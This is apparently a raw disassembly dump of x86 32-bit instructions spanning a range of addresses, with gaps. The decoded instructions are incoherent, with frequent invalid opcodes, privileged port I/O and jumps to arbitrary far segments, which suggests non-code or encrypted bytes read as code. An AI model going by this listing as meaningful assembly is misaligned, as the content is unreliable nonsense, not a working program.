  424de5:	cmp    DWORD PTR [edi+0x1c9afbcd],esp
  424deb:	xor    eax,0xe3a7b39d
  424df0:	mov    bh,0xf6
  424df2:	dec    ebx
  424df3:	loop   0x424df7
  424df5:	jnp    0x424e05
  424df7:	retf   
  424df8:	loop   0x424e69
  424dfa:	dec    edx
  424dfb:	repnz retf 0x35d9
  424dff:	and    DWORD PTR [edi+ebp*8],0x4d
  424e03:	xlat   BYTE PTR ds:[ebx]
  424e04:	sub    ebp,DWORD PTR [ebp-0x1c]
  424e07:	and    BYTE PTR [ecx-0x6d65e7d1],al
  424e0d:	pop    esp
  424e0e:	loop   0x424dbc
  424e10:	jge    0x424e12
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ee0
  424e81:	pop    eax
  424e82:	fisub  WORD PTR [edx+0x18a65]
  424e88:	add    eax,0xbc000001
  424e8d:	sbb    eax,0xad6fa961
  424e92:	push   es
  424e93:	rcr    BYTE PTR [ebx],0x88
  424e96:	loop   0x424e78
  424e98:	icebp  
  424e99:	jae    0x424ed7
  424e9b:	mov    gs,WORD PTR [esi]
  424e9d:	leave  
  424e9e:	lds    ebp,FWORD PTR [edx+0x35df4326]
  424ea4:	pop    eax
  424ea5:	inc    esp
  424ea6:	jo     0x424e6b
  424ea8:	mov    al,ds:0xae368947
  424ead:	or     cl,ah
  424eaf:	outs   dx,DWORD PTR ds:[esi]
  424eb0:	aam    0xd0
  424eb2:	cli    
  424eb3:	in     al,0xae
  424eb5:	xor    esi,DWORD PTR [ebx-0xca19ca3]
  424ebb:	aas    
  424ebc:	jg     0x424e4f
  424ebe:	or     edx,DWORD PTR [edi]
  424ec0:	jge    0x424f1d
  424ec2:	outs   dx,BYTE PTR ds:[esi]
  424ec3:	pop    ecx
  424ec4:	push   es
  424ec5:	or     edx,DWORD PTR [ebx+0x18]
  424ec8:	hlt    
  424ec9:	pop    esi
  424eca:	outs   dx,BYTE PTR ds:[esi]
  424ecb:	(bad)  
  424ecd:	mov    esp,0x6ab023bf
  424ed2:	pop    ss
  424ed3:	push   esp
  424ed4:	outs   dx,BYTE PTR ds:[esi]
  424ed5:	stos   DWORD PTR es:[edi],eax
  424ed6:	mov    bh,0x3a
  424ed8:	leave  
  424ed9:	mov    eax,0xf5458e2d
  424ede:	and    eax,0xc8b71424
  424ee3:	push   esp
  424ee4:	jmp    0xd064:0xed01
  424eea:	jne    0x424edb
  424eec:	inc    ebx
  424eed:	lock xor eax,0x1628316d
  424ef3:	repnz dec ebx
  424ef5:	not    dl
  424ef7:	in     al,dx
  424ef8:	out    dx,al
  424ef9:	sbb    BYTE PTR [eax-0x6ad452b],al
  424eff:	das    
  424f00:	jmp    0xdb47:0x49ed03f6
  424f07:	loop   0x424ecc
  424f09:	lds    edi,FWORD PTR [ecx]
  424f0b:	cmp    BYTE PTR [ebp+0x5c59b3b9],bh
  424f11:	imul   ecx,DWORD PTR [eax+esi*4+0x420cd031],0x1d360185
  424f1c:	xchg   edx,eax
  424f1d:	aam    0x42
  424f1f:	cmc    
  424f20:	cmp    ebx,DWORD PTR [edx-0x5e293821]
  424f26:	ret    0x108b
  424f29:	imul   eax,DWORD PTR [ecx+0x32cbf3f7],0x1ce05051
  424f33:	mov    ebp,0x717936cf
  424f38:	setns  BYTE PTR [eax-0x6d9bdcb0]
  424f3f:	fnstsw WORD PTR [eax+esi*1-0x33a102f5]
  424f46:	jge    0x424f4f
  424f48:	sbb    cl,BYTE PTR [edi]
  424f4a:	(bad)  
  424f4b:	lds    ecx,FWORD PTR [edx+esi*2]
  424f4e:	and    eax,0x69f15a2a
  424f53:	call   0xcacaaaff
  424f58:	out    0x6,al
  424f5a:	mov    edi,ebx
  424f5c:	dec    esp
  424f5d:	fnstcw WORD PTR ds:0x9485d44d
  424f63:	shl    BYTE PTR [eax+eiz*4+0x23c712c6],1
  424f6a:	dec    esp
  424f6b:	mov    bl,0xc7
  424f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f6f:	and    al,0xcb
  424f71:	mov    ss,WORD PTR [edx+0x48]
  424f74:	xchg   ebx,eax
  424f75:	pop    eax
  424f76:	outs   dx,BYTE PTR ds:[esi]
  424f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f78:	xor    dh,BYTE PTR [eax+0x1a8923c2]
  424f7e:	repz sahf 
  424f80:	push   esp
  424f81:	xchg   esp,eax
  424f82:	sub    al,0xc5
  424f84:	outs   dx,BYTE PTR ds:[esi]
  424f85:	push   cs
  424f86:	xchg   BYTE PTR cs:[ebx+0x70],bl
  424f8a:	inc    ebp
  424f8b:	dec    eax
  424f8c:	dec    DWORD PTR [edi]
  424f8e:	pushf  
  424f8f:	mov    ds:0x16,eax
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	inc    DWORD PTR [edi+edi*2]
  425003:	adc    al,0x6a
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0xc0000001,al
  42500d:	imul   eax,DWORD PTR [eax+eax*1-0x1480a700],0x5600955f
  425018:	arpl   WORD PTR [edx],ax
  42501a:	or     eax,ebx
  42501c:	shl    esp,1
  42501e:	push   ds
  42501f:	data16 jnp 0x424fb9
  425022:	xor    ebp,DWORD PTR [ebp+0x6be93a96]
  425028:	mov    ds:0x1399e045,eax
  42502d:	sar    DWORD PTR [esi+0x79b97da9],cl
  425033:	dec    ebp
  425034:	jp     0x425005
  425036:	out    dx,al
  425037:	test   BYTE PTR [eax+eiz*2+0x47755c60],ch
  42503e:	mov    al,0x5a
  425040:	fs loopne 0x425041
  425043:	test   eax,0x4ebee7aa
  425048:	jmp    0x4250c1
  42504a:	inc    esp
  42504b:	data16 sbb bh,bl
  42504e:	add    BYTE PTR [ecx-0x6c8832],ah
  425054:	imul   esp,DWORD PTR [edx+0x15455bc6],0xb
  42505b:	push   ecx
  42505c:	(bad)  
  42505d:	mov    ebx,0x1f7d3577
  425062:	cmp    eax,0xb2128024
  425067:	sbb    al,0xa6
  425069:	es pop edi
  42506b:	xor    BYTE PTR [ebp+0x25],al
  42506e:	aas    
  42506f:	cld    
  425070:	ror    DWORD PTR [esi-0x678b4ca7],0x32
  425077:	push   eax
  425078:	rol    BYTE PTR [edi+0x7275ca0f],1
  42507e:	gs mov al,0x92
  425081:	lods   eax,DWORD PTR ds:[esi]
  425082:	repnz xor bh,ah
  425085:	scas   al,BYTE PTR es:[edi]
  425086:	bound  esi,QWORD PTR ds:0x3c823119
  42508c:	sub    BYTE PTR [edi],0xf5
  42508f:	inc    eax
  425090:	add    BYTE PTR [eax],dl
  425092:	mov    edi,0x1c9d0614
  425097:	mov    dl,0x30
  425099:	sub    BYTE PTR [eax+0x157e1b62],bh
  42509f:	loopne 0x425091
  4250a1:	xlat   BYTE PTR ds:[ebx]
  4250a2:	mov    bl,0xa8
  4250a4:	sahf   
  4250a5:	xor    DWORD PTR [esi],ebp
  4250a7:	adc    al,0x83
  4250a9:	out    0x4,al
  4250ab:	adc    eax,0x87998c53
  4250b0:	xchg   esp,eax
  4250b1:	fsubr  DWORD PTR [edi+0x53]
  4250b4:	sar    BYTE PTR [edi+0x51],cl
  4250b7:	jmp    0x42506f
  4250b9:	clc    
  4250ba:	mov    dl,0x76
  4250bc:	out    dx,al
  4250bd:	sub    edx,edi
  4250bf:	js     0x425106
  4250c1:	cdq    
  4250c2:	repz pop edx
  4250c4:	aam    0x9b
  4250c6:	sub    eax,0xd6241aa
  4250cb:	not    BYTE PTR [ebp+0x12783eb0]
  4250d1:	pop    edi
  4250d2:	sub    DWORD PTR [esi-0x36],edx
  4250d5:	repnz adc ch,BYTE PTR [ebp+0x7c]
  4250d9:	sar    BYTE PTR [ebx],1
  4250db:	dec    eax
  4250dc:	or     al,0x3b
  4250de:	push   ebx
  4250df:	lock and BYTE PTR [edi-0x58],ah
  4250e3:	add    al,0xd8
  4250e5:	rcl    BYTE PTR [ebp+0x2c47f842],1
  4250eb:	mov    edi,0x2473c4fe
  4250f0:	mov    edi,DWORD PTR [edi+0x6dfd26eb]
  4250f6:	cmp    ch,BYTE PTR [ebx+0x7732c7f0]
  4250fc:	dec    ecx
  4250fd:	push   esp
  4250fe:	pop    edi
  4250ff:	push   ss
  425100:	jg     0x4250f3
  425102:	sub    al,0x3d
  425104:	fdivp  st(0),st
  425106:	call   0x380f:0xa51261c3
  42510d:	jle    0x4250f0
  42510f:	jl     0x425131
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xda0c:0x6bd092e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x72000001,al
  42518d:	test   al,0x64
  42518f:	jl     0x425161
  425191:	dec    ecx
  425192:	jmp    0xed2f089e
  425197:	dec    esp
  425198:	sub    DWORD PTR [edi+0x74640897],edi
  42519e:	sub    al,0x2
  4251a0:	mov    ebx,0x374e250d
  4251a5:	stc    
  4251a6:	dec    edi
  4251a7:	scas   al,BYTE PTR es:[edi]
  4251a8:	ror    DWORD PTR [edi+0x30],1
  4251ab:	push   0x502f84b8
  4251b0:	xlat   BYTE PTR ds:[ebx]
  4251b1:	mov    ecx,0x36c3a595
  4251b6:	lds    edi,FWORD PTR [ebp-0x5cf0ddae]
  4251bc:	arpl   WORD PTR ds:0xc1aaab15,di
  4251c2:	mov    eax,0xa5bc3514
  4251c7:	cmp    BYTE PTR [ecx-0x7d],ch
  4251ca:	loope  0x4251d8
  4251cc:	pop    ds
  4251cd:	mov    ch,0x46
  4251cf:	or     bl,ch
  4251d1:	iret   
  4251d2:	in     al,0x10
  4251d4:	push   esp
  4251d5:	xor    al,BYTE PTR [edi-0x6c8fa55d]
  4251db:	pushf  
  4251dc:	sahf   
  4251dd:	jnp    0x42516f
  4251df:	mov    BYTE PTR [esi+0x248be661],ah
  4251e5:	jl     0x425193
  4251e7:	std    
  4251e8:	imul   edx,DWORD PTR [edi+0x7cc3c17f],0xd0c31e62
  4251f2:	jmp    0x4251b8
  4251f4:	pop    ebx
  4251f5:	clc    
  4251f6:	rcr    BYTE PTR [eax-0x2a],cl
  4251f9:	std    
  4251fa:	icebp  
  4251fb:	add    eax,0x21239208
  425200:	je     0x425192
  425202:	in     al,dx
  425203:	mov    ah,0xe4
  425205:	std    
  425206:	repz mov edi,esp
  425209:	jmp    0x3ec8bedf
  42520e:	push   edi
  42520f:	or     ch,BYTE PTR [ecx+edx*4]
  425212:	dec    ecx
  425213:	adc    ah,BYTE PTR [ebx]
  425215:	xchg   edx,eax
  425216:	out    dx,al
  425217:	std    
  425218:	inc    eax
  425219:	test   DWORD PTR [edi],edx
  42521b:	mov    ebx,0x3c580fa0
  425220:	loopne 0x425273
  425222:	pop    edx
  425223:	into   
  425224:	push   eax
  425225:	hlt    
  425226:	push   edx
  425227:	and    BYTE PTR [ebx+0x1380c829],0x8e
  42522e:	sbb    eax,0x3fcf1c57
  425233:	pop    edi
  425234:	or     BYTE PTR [edx-0x14d8b9d0],dh
  42523a:	fldcw  WORD PTR [esi+0x38a5bea1]
  425240:	pop    edx
  425241:	int    0x67
  425243:	adc    bl,BYTE PTR [eax+0x18f5176c]
  425249:	sub    eax,0x7db45fa
  42524e:	dec    ebx
  42524f:	aad    0x2e
  425251:	mov    DWORD PTR [edx+0x1],edx
  425254:	and    edx,esi
  425256:	pop    ebp
  425257:	and    BYTE PTR [edx],dl
  425259:	shl    dh,0xc8
  42525c:	mov    bl,0x7d
  42525e:	fld    QWORD PTR [edi+0x4f]
  425261:	mov    dh,0x5d
  425263:	aam    0x60
  425265:	adc    ch,BYTE PTR [eax-0x37]
  425268:	mov    ds:0x1db908b4,eax
  42526d:	cmp    DWORD PTR [eax-0x1eda8df4],ecx
  425273:	xchg   ebx,eax
  425274:	test   BYTE PTR [eax],bh
  425276:	mov    ah,0x86
  425278:	sub    BYTE PTR [edi+ebp*8-0xc75ceeb],ah
  42527f:	xlat   BYTE PTR ds:[ebx]
  425280:	and    eax,DWORD PTR [edx]
  425282:	int3   
  425283:	xchg   ebx,eax
  425284:	dec    eax
  425285:	out    dx,eax
  425286:	stc    
  425287:	enter  0x4a3f,0x60
  42528b:	inc    ebp
  42528c:	scas   eax,DWORD PTR es:[edi]
  42528d:	push   ebp
  42528e:	mov    edx,0xafb4
	...
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	ret    0x70aa
  425303:	into   
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x71000001
  42530d:	in     eax,dx
  42530e:	mov    al,BYTE PTR [ecx]
  425310:	bound  ecx,QWORD PTR [esi+ecx*1+0x737b00aa]
  425317:	in     al,0x78
  425319:	out    0x4b,al
  42531b:	push   ss
  42531c:	inc    ebp
  42531d:	push   edi
  42531e:	ja     0x4252fb
  425320:	jecxz  0x4252f0
  425322:	cwde   
  425323:	push   edi
  425324:	ret    
  425325:	jo     0x42538c
  425327:	(bad)  
  425328:	jge    0x425381
  42532a:	xchg   ebp,eax
  42532b:	or     edx,ebx
  42532d:	mov    BYTE PTR [ebp+0x58],cl
  425330:	mov    ah,0x30
  425332:	and    al,BYTE PTR [ecx]
  425334:	jns    0x4252d7
  425336:	add    BYTE PTR [ecx+0x8],ah
  425339:	stos   DWORD PTR es:[edi],eax
  42533a:	push   es
  42533b:	int    0xa6
  42533d:	dec    ebx
  42533e:	test   eax,0x6e4f146e
  425343:	rol    DWORD PTR ds:0x20396a15,cl
  425349:	mov    esp,DWORD PTR [eax+ebx*2-0x7c]
  42534d:	fst    DWORD PTR [edi]
  42534f:	push   eax
  425350:	mov    edi,0x295adefb
  425355:	mov    ch,0xeb
  425357:	test   al,0xdc
  425359:	or     al,0x74
  42535b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42535c:	adc    eax,0xfc8ffaa0
  425361:	(bad)  
  425362:	(bad)  
  425365:	or     DWORD PTR [eax],ecx
  425367:	call   0xf8579ee6
  42536c:	das    
  42536d:	rol    BYTE PTR [edi],cl
  42536f:	dec    esi
  425370:	xor    al,BYTE PTR [ebx]
  425372:	pusha  
  425373:	mov    dh,0x90
  425375:	mov    BYTE PTR [ebx+0x50],al
  425378:	push   cs
  425379:	pop    es
  42537a:	mov    al,0x3f
  42537c:	jnp    0x42533b
  42537e:	fisttp QWORD PTR [edx]
  425380:	inc    eax
  425381:	enter  0xe6e,0xf8
  425385:	adc    DWORD PTR [eax],edx
  425387:	fist   DWORD PTR [ecx+0x530d6fe6]
  42538d:	into   
  42538e:	dec    edx
  42538f:	int    0x94
  425391:	jns    0x4253bc
  425393:	(bad)  
  425394:	and    esp,ebp
  425396:	repnz mov dl,0xce
  425399:	xor    eax,0x6324589d
  42539e:	cdq    
  42539f:	(bad)  
  4253a0:	(bad)  
  4253a1:	fnstenv [edi]
  4253a3:	inc    esp
  4253a4:	xlat   BYTE PTR ds:[ebx]
  4253a5:	ds aam 0x7
  4253a8:	or     DWORD PTR [eax],esp
  4253aa:	(bad)  [edi-0x4572349c]
  4253b0:	loop   0x4253a4
  4253b2:	out    dx,eax
  4253b3:	pop    ebx
  4253b4:	xchg   BYTE PTR [esi],bl
  4253b6:	addr16 mov ebp,0xce00de0b
  4253bc:	std    
  4253bd:	dec    ecx
  4253be:	ins    DWORD PTR es:[edi],dx
  4253bf:	mov    ds:0xf9cc382b,al
  4253c4:	out    0x60,eax
  4253c6:	or     eax,0x95a0cf81
  4253cb:	mov    edx,0xae4a5e55
  4253d0:	add    esi,esp
  4253d2:	bound  ebx,QWORD PTR ds:0xb9227938
  4253d8:	xchg   DWORD PTR [ebp-0x7ab25331],esi
  4253de:	xchg   ecx,eax
  4253df:	sbb    edi,edx
  4253e1:	jnp    0x4253dc
  4253e3:	stc    
  4253e4:	mov    edi,DWORD PTR [ebx]
  4253e6:	sbb    al,0x57
  4253e8:	pop    edx
  4253e9:	inc    esp
  4253ea:	jae    0x4253b8
  4253ec:	jo     0x4253b1
  4253ee:	nop
  4253ef:	mov    dh,0x76
  4253f1:	sbb    al,0x99
  4253f3:	or     BYTE PTR [eax+0x22],0x1e
  4253f7:	add    eax,0xb8116e09
  4253fc:	stos   DWORD PTR es:[edi],eax
  4253fd:	xchg   esi,eax
  4253fe:	inc    edi
  4253ff:	mov    edx,0x434917b4
  425404:	jns    0x425467
  425406:	pop    ss
  425407:	adc    esp,ebp
  425409:	sahf   
  42540a:	mov    al,ds:0x28cab7aa
  42540f:	mov    DWORD PTR [ecx+0x0],ebp
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ecx,DWORD PTR [edx]
  425481:	gs inc ecx
  425483:	call   0x43e301
  425488:	add    eax,0xb8000001
  42548d:	xor    bh,BYTE PTR [ecx-0xf]
  425490:	and    DWORD PTR [edx],esp
  425492:	and    ebp,edi
  425494:	shl    bl,1
  425496:	ss pop es
  425498:	popf   
  425499:	repz jl 0x425454
  42549c:	push   esp
  42549d:	sahf   
  42549e:	sbb    ebx,DWORD PTR [ebx*8+0x71c2fc29]
  4254a5:	mov    al,ds:0xa1766afc
  4254aa:	test   ecx,ebp
  4254ac:	jmp    0x330f91df
  4254b1:	stos   BYTE PTR es:[edi],al
  4254b2:	cmp    ecx,0xfffffffd
  4254b5:	scas   al,BYTE PTR es:[edi]
  4254b6:	fwait
  4254b7:	into   
  4254b8:	test   DWORD PTR [edx],ecx
  4254ba:	js     0x4254b2
  4254bc:	bound  edx,QWORD PTR [ecx+0x4caf99d9]
  4254c2:	scas   al,BYTE PTR es:[edi]
  4254c3:	out    dx,eax
  4254c4:	sahf   
  4254c5:	imul   edi,DWORD PTR [eax-0x278a99bc],0x7
  4254cc:	(bad)  
  4254cd:	mov    bh,0x78
  4254cf:	or     edi,DWORD PTR [ebx]
  4254d1:	das    
  4254d2:	leave  
  4254d3:	xchg   esp,eax
  4254d4:	inc    eax
  4254d5:	xchg   ebp,eax
  4254d6:	jle    0x4254f8
  4254d8:	js     0x425509
  4254da:	inc    eax
  4254db:	call   FWORD PTR ds:[ebp+esi*4+0x6f5bbab]
  4254e3:	(bad)  
  4254e4:	lock (bad) 
  4254e6:	ds int 0xfd
  4254e9:	mov    fs,WORD PTR [eax+0x16ff0efa]
  4254ef:	dec    esp
  4254f0:	out    0xf7,eax
  4254f2:	mov    eax,0x9f842583
  4254f7:	adc    DWORD PTR [edx+0x631c8e51],edx
  4254fd:	sub    ecx,DWORD PTR [ecx-0x7242ede6]
  425503:	dec    eax
  425504:	sub    al,0xad
  425506:	sub    eax,0xd6a79d05
  42550b:	inc    edx
  42550c:	dec    esp
  42550d:	mov    bh,0xdc
  42550f:	rcl    ebx,1
  425511:	ins    BYTE PTR es:[edi],dx
  425512:	pop    DWORD PTR [eax+eiz*1-0x7e2273e8]
  425519:	aad    0x4a
  42551b:	and    eax,0x5af5952
  425520:	add    eax,0x85dab645
  425525:	repnz aaa 
  425527:	pop    eax
  425528:	jp     0x4254b7
  42552a:	outs   dx,BYTE PTR ds:[esi]
  42552b:	rcl    BYTE PTR [edi+ecx*2+0x51b4bbe4],0x39
  425533:	sahf   
  425534:	mov    ds:0x8beebc9e,eax
  425539:	inc    ebx
  42553a:	or     al,0xfe
  42553c:	cli    
  42553d:	pop    ebp
  42553e:	add    cl,dl
  425540:	outs   dx,DWORD PTR ds:[esi]
  425541:	jns    0x4255c1
  425543:	or     DWORD PTR [esp+edx*8+0x2301f92d],esp
  42554a:	enter  0xa719,0x3a
  42554e:	aam    0x1e
  425550:	sbb    al,0x6e
  425552:	jno    0x425584
  425554:	add    eax,DWORD PTR [edx+ebp*1]
  425557:	mov    ds:0x6d4cd4ce,eax
  42555c:	cmp    al,BYTE PTR [esi]
  42555e:	pop    ecx
  42555f:	adc    edx,esp
  425561:	cli    
  425562:	nop
  425563:	in     eax,dx
  425564:	call   0x3101:0xc2b55aad
  42556b:	add    al,BYTE PTR ds:0xffbcbde6
  425571:	and    eax,0x8c3c5a3
  425576:	dec    eax
  425577:	out    0xff,al
  425579:	lock and bl,dh
  42557c:	push   ss
  42557d:	pop    edi
  42557e:	xchg   ebp,eax
  42557f:	in     eax,0x9b
  425581:	cld    
  425582:	(bad)  
  425583:	fist   DWORD PTR [esi-0x5]
  425586:	inc    ebp
  425587:	jle    0x4255b3
  425589:	loopne 0x42559d
  42558b:	gs mov ah,0x5b
  42558e:	jae    0x42552f
  425590:	mov    ds:0x0,eax
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xf687f13a
  425602:	mov    ch,0x79
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0xa9000001
  42560d:	std    
  42560e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42560f:	xchg   BYTE PTR [ebx-0x5c006e32],al
  425615:	std    
  425616:	jp     0x42566e
  425618:	push   cs
  425619:	mov    dh,0xef
  42561b:	adc    eax,0xc6b207d6
  425620:	xchg   ecx,eax
  425621:	pop    es
  425622:	test   BYTE PTR [ebx+0x4f],cl
  425625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425626:	jecxz  0x425678
  425628:	pop    ds
  425629:	lahf   
  42562a:	scas   al,BYTE PTR es:[edi]
  42562b:	xchg   esp,eax
  42562c:	aam    0x15
  42562e:	inc    ebx
  42562f:	imul   edi,DWORD PTR [esi+0x383a833e],0x3
  425636:	out    dx,eax
  425637:	and    ebx,DWORD PTR [ecx-0x15]
  42563a:	mov    ecx,DWORD PTR [edx+ebx*2-0x6f]
  42563e:	mov    eax,ds:0x758d198
  425643:	loop   0x425692
  425645:	pop    ebx
  425646:	cmp    ah,BYTE PTR [ebx]
  425648:	cdq    
  425649:	cld    
  42564a:	pop    ss
  42564b:	cdq    
  42564c:	adc    DWORD PTR [eax+edx*1-0x24],esp
  425650:	or     dl,BYTE PTR [esi-0xe]
  425653:	pop    esp
  425654:	inc    edx
  425655:	arpl   dx,ax
  425657:	and    eax,0x5df81f0f
  42565c:	add    al,0x2
  42565e:	(bad)  
  42565f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425660:	stc    
  425661:	cmp    BYTE PTR [eax],ch
  425663:	mov    gs,edx
  425665:	es dec ebx
  425667:	int3   
  425668:	std    
  425669:	xor    BYTE PTR [esi-0x70],cl
  42566c:	xlat   BYTE PTR ds:[ebx]
  42566d:	cli    
  42566e:	jge    0x42569e
  425670:	adc    bl,BYTE PTR [esi]
  425672:	mov    ch,0xee
  425674:	icebp  
  425675:	repz xor bl,BYTE PTR [ecx-0x75]
  425679:	dec    esi
  42567a:	popf   
  42567b:	sar    cl,cl
  42567d:	cmp    DWORD PTR [edx+eax*2-0x7c],0xffffffb9
  425682:	stos   DWORD PTR es:[edi],eax
  425683:	pop    edi
  425684:	ja     0x425688
  425686:	inc    edx
  425687:	out    0xee,al
  425689:	pop    ss
  42568a:	fbstp  TBYTE PTR [edi]
  42568c:	inc    esp
  42568d:	xchg   dl,cl
  42568f:	and    dh,al
  425691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425692:	fisub  WORD PTR [edx+0x3e47419b]
  425698:	add    ebx,eax
  42569a:	or     eax,0x6e270a7a
  42569f:	out    dx,al
  4256a0:	in     eax,0xae
  4256a2:	or     ch,BYTE PTR [edx]
  4256a4:	fisttp QWORD PTR [eax]
  4256a6:	mov    bl,0xfb
  4256a8:	add    al,0x18
  4256aa:	xchg   ecx,eax
  4256ab:	pusha  
  4256ac:	fs and eax,0x4774299a
  4256b2:	inc    eax
  4256b3:	push   cs
  4256b4:	out    dx,eax
  4256b5:	ins    DWORD PTR es:[edi],dx
  4256b6:	push   0x83c40316
  4256bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256bc:	cmp    DWORD PTR [ebp-0x72306f8d],eax
  4256c2:	jno    0x4256f2
  4256c4:	daa    
  4256c5:	pop    eax
  4256c6:	or     al,0x4a
  4256c8:	or     al,0x19
  4256ca:	int3   
  4256cb:	push   esp
  4256cc:	ret    
  4256cd:	mov    eax,0xda9b7efb
  4256d2:	pop    eax
  4256d3:	adc    al,0x6f
  4256d5:	push   esi
  4256d6:	jmp    0x29ad:0x3c7f1386
  4256dd:	inc    edx
  4256de:	ins    BYTE PTR es:[edi],dx
  4256df:	int3   
  4256e0:	adc    BYTE PTR [esi-0x4e],bh
  4256e3:	or     ch,al
  4256e5:	xchg   ecx,eax
  4256e6:	outs   dx,BYTE PTR ds:[esi]
  4256e7:	add    dl,BYTE PTR [edx-0x607d9009]
  4256ed:	pop    es
  4256ee:	jge    0x42574f
  4256f0:	into   
  4256f1:	out    0x9b,eax
  4256f3:	and    eax,0x89aa8ce1
  4256f8:	dec    ecx
  4256f9:	inc    eax
  4256fa:	pop    esp
  4256fb:	pop    edi
  4256fc:	fdiv   st(5),st
  4256fe:	or     eax,0x4f89b87b
  425703:	sub    al,0x8d
  425705:	and    eax,0x7a81b035
  42570a:	ins    DWORD PTR es:[edi],dx
  42570b:	mov    eax,0x8584075a
  425710:	bound  eax,QWORD PTR [eax]
	...
  425772:	add    BYTE PTR [eax],al
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x8843bf74
  425783:	adc    al,0x83
  425785:	nop
  425786:	add    DWORD PTR [eax],eax
  425788:	add    eax,0x5000001
  42578d:	sbb    dh,BYTE PTR [esi]
  42578f:	push   0x8f67db
  425794:	mov    DWORD PTR [eax],ebp
  425796:	inc    edi
  425797:	mov    ?,edi
  425799:	dec    ebx
  42579a:	push   esp
  42579b:	stos   DWORD PTR es:[edi],eax
  42579c:	cs or  al,0xc7
  42579f:	inc    edi
  4257a0:	sahf   
  4257a1:	fadd   QWORD PTR [edi]
  4257a3:	dec    edx
  4257a4:	jg     0x4257a6
  4257a6:	(bad)  
  4257a7:	pop    ss
  4257a8:	ds xor eax,0x92c1d86b
  4257ae:	mov    ch,bl
  4257b0:	mov    al,0xb5
  4257b2:	and    DWORD PTR ds:0xd038e3bb,ebp
  4257b8:	ds nop
  4257ba:	inc    ebx
  4257bb:	dec    edi
  4257bc:	lods   eax,DWORD PTR ds:[esi]
  4257bd:	loope  0x425836
  4257bf:	inc    eax
  4257c0:	pop    es
  4257c1:	gs mov edi,0x2c71b3d8
  4257c7:	add    BYTE PTR [ecx+ebp*1+0x61],cl
  4257cb:	sbb    DWORD PTR [ecx+eiz*4+0x3a],edi
  4257cf:	mov    dl,0x6d
  4257d1:	push   ebp
  4257d2:	adc    eax,0x36a7df1c
  4257d7:	pop    ebp
  4257d8:	inc    esi
  4257d9:	xchg   esp,eax
  4257da:	xor    DWORD PTR [ebx+0x6e],0xfa73c16f
  4257e1:	rcr    DWORD PTR [ecx-0x66],1
  4257e4:	jb     0x425779
  4257e6:	jae    0x4257f2
  4257e8:	adc    BYTE PTR [eax+0x18],ah
  4257eb:	inc    edx
  4257ec:	fcmove st,st(3)
  4257ee:	mov    al,0x4c
  4257f0:	mov    ebp,0x9540881a
  4257f5:	imul   esi,DWORD PTR [edx+0x63a122ac],0x8be92ce3
  4257ff:	sbb    ebp,DWORD PTR [edx]
  425801:	les    edi,FWORD PTR [eax+esi*8]
  425804:	mov    dh,ah
  425806:	fst    QWORD PTR [ecx-0x79]
  425809:	mov    edi,0x978d775b
  42580e:	mov    cl,0x15
  425810:	nop
  425811:	or     eax,DWORD PTR ds:0x92ec0587
  425817:	aas    
  425818:	xor    DWORD PTR [edi+0x46],esp
  42581b:	out    dx,eax
  42581c:	or     bh,al
  42581e:	cmp    BYTE PTR [ecx-0x636a3fcb],cl
  425824:	retf   0x14b8
  425827:	push   cs
  425828:	das    
  425829:	out    0xa9,eax
  42582b:	add    BYTE PTR [edx-0x33],0x28
  42582f:	jmp    0x67dd:0xfa7cf1e9
  425836:	inc    eax
  425837:	jo     0x42587b
  425839:	jns    0x42587a
  42583b:	adc    bl,dh
  42583d:	mov    eax,fs
  42583f:	mov    esi,0xa66bd6af
  425844:	into   
  425845:	scas   al,BYTE PTR es:[edi]
  425846:	out    0x39,al
  425848:	aas    
  425849:	jge    0x42589c
  42584b:	or     DWORD PTR [esi-0x25],esp
  42584e:	push   ss
  42584f:	fs jns 0x42581c
  425852:	cmp    al,0x67
  425854:	scas   eax,DWORD PTR es:[edi]
  425855:	pusha  
  425856:	push   0x28757aae
  42585b:	and    BYTE PTR [edx],ch
  42585d:	out    0x5,al
  42585f:	jmp    0x670cb765
  425864:	outs   dx,BYTE PTR ds:[esi]
  425865:	gs out 0xba,al
  425868:	popa   
  425869:	add    eax,DWORD PTR [edi-0x1699c636]
  42586f:	neg    BYTE PTR [ecx-0x6a]
  425872:	outs   dx,BYTE PTR ds:[esi]
  425873:	and    DWORD PTR [esi+0x7b],esi
  425876:	in     eax,0xe2
  425878:	mov    bl,0x4b
